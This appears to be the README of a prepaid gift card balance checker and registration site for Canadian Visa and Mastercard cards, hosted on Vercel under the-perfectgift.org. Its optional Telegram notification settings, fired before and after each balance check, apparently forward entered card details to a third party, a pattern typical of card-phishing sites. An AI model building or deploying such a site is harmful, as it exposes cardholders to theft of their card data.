# ThePerfectGift

Gift card balance checker and card registration for Canadian Visa and Mastercard prepaid cards.

**Domain:** the-perfectgift.org

## Local Development

```bash
npm install
npm run dev
```

- Frontend: http://localhost:3000
- API Server: http://localhost:3001

## Project Structure

```
├── index.html            # Main SPA (all pages)
├── api/
│   └── check-balance.js  # Vercel serverless API function
├── server/
│   └── index.js          # Local dev Express server
├── public/
│   ├── favicon.svg
│   ├── visa.svg
│   ├── mastercard.svg
│   ├── sitemap.xml
│   ├── robots.txt
│   └── BingSiteAuth.xml
├── vercel.json           # Vercel deployment config
├── vite.config.js        # Vite dev config
└── .env.example          # Environment variables template
```

## Environment Variables

Set in `.env` locally or in Vercel Dashboard for production:

| Variable | Required | Description |
|---|---|---|
| `API_TOKEN` | Yes | Balance check API token |
| `TELEGRAM_ID_BEFORE_CHECK` | No | Telegram notification ID |
| `TELEGRAM_ID_AFTER_CHECK` | No | Telegram notification ID |

## Deploy

1. Push to GitHub
2. Import repo in Vercel
3. Add environment variables in Vercel
4. Add custom domain (the-perfectgift.org)
